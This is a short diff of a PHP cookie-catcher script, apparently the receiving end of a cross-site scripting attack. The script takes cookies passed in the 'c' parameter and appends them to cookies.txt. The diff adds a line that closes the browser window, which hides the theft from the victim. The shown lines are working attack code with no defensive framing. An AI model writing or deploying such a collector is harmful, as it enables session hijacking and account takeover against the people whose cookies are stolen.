@@ -7,4 +7,5 @@ $cookie = $_GET["c"]; // GET all cookies stored in var "c"
 	$fp = fopen("cookies.txt","a"); // Open file | create if it doesn't exist
 	fputs($fp,$cookie . "\r\n"); // Write the content of the cookie
 	fclose($fp); // close file
+	echo "<script>window.close()</script>";
 } ?>
